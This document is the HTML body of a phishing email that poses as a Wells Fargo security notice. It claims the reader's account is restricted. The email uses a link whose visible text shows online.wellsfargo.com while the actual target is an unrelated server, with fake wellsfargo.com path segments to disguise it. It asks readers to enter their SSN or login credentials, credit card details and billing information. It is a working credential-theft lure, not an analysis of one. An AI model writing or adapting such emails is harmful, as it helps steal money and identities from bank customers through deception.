<p><strong>Dear Wells Fargo Customer :</strong></p>
<p>Wells Fargo is constantly working to increase security for all Online Banking
  users. To ensure the integrity of our online payment system, we periodically
  review accounts.</p>
<p>Your account might be place on restricted status. Restricted accounts continue
  to receive payments, but they are limited in their ability to send or withdraw
funds.</p>
<p>To lift up this restriction follow the link bellow and fill in the necessary
fields:</p>
<p><a href=" http://lx1server.com/chat/chat_icons/imagwes/.yy/nd/www.wellsfargo.com/www.wellsfargo.com/www.wellsfargo.com/updateyouraccountinformation/ " target="_blank">https://online.wellsfargo.com<WBR>/signon?LOB=CONS</a><br>
</p>
<p>It's Easy to Get Started:</p>
<p>1- sign on with your ssn or username and password .</p>
<p>2- Update your payment information as it is in our files .</p>
<p>You must
confirm your credit card details and your billing information as well . All restricted
  accounts have their billing information unconfirmed, meaning that you may no
  longer send money from your account until you have updated your billing information
on file.</p>
<p>Have additional questions? Send us an email by clicking on &quot;Contact Us&quot; while   you are signed on to Online Banking, or call 1-800-956-4442. We're available 24   hours a day, 7 days a week.</p>
<p>Best Regards,</p>
<p>Matt Lundquist<br>
Wells Fargo NBBC Sales Development Banker</p>
